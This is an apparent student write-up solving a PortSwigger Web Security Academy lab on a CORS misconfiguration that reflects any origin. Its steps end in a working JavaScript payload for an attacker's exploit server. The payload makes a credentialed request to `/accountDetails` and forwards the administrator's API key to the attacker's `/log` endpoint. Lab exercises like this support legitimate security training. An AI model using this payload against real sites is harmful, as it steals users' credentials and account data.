# URL
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
# Concept
* CORS origin reflection vulnerability
# Description
 This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 
# Method of solve
* we open up the lab website with the Burp Suite browser
* we login to the application wtih our provided credentials `wiener:peter`
* we notice that the API key for our user is included on the resulting page after we login
* look in the Burp Suite `HTTP history` tab to see that our user information is returned to us by the `/accountDetails` request
* when we look at that request, we notice that a JSON object is returned which includes details like our `username` and the `apikey`
* in the response, we have to observe that there is a `Access-Control-Allow-Credentials` header, which is set to `True`
* this kind of header could indicate that there is a CORS vulnerability in the app
* if there is, we could retrieve any user's info in the app
* we go back to the `/accountDetails` request and include an additional header: `Origin`, and set it to an arbitrary website, like `http://example.com`
* we see that in the response the URL that we specified is reflected in a header called `Access-Control-Allow-Origin`
* so to exploit the CORS vulnerability, we need to setup an attacker server which a specific Javascript payload:
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://<YOUR_SUBDOMAIN_HERE>.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
* this code would go in the body portion of your exploit server page
* then save the exploit and send the exploit
* go to the logs on your exploit server app and you should see a request to the `/log` endpoint where the URL parameter included is the JSON information for the administrator user
* since the default user on the app is the admin user, we receive the admin user's data in the response
* grab the URL parameter value and URL decode it and you'll get the JSON object, which includes the `apikey` value
* submit that finish the lab









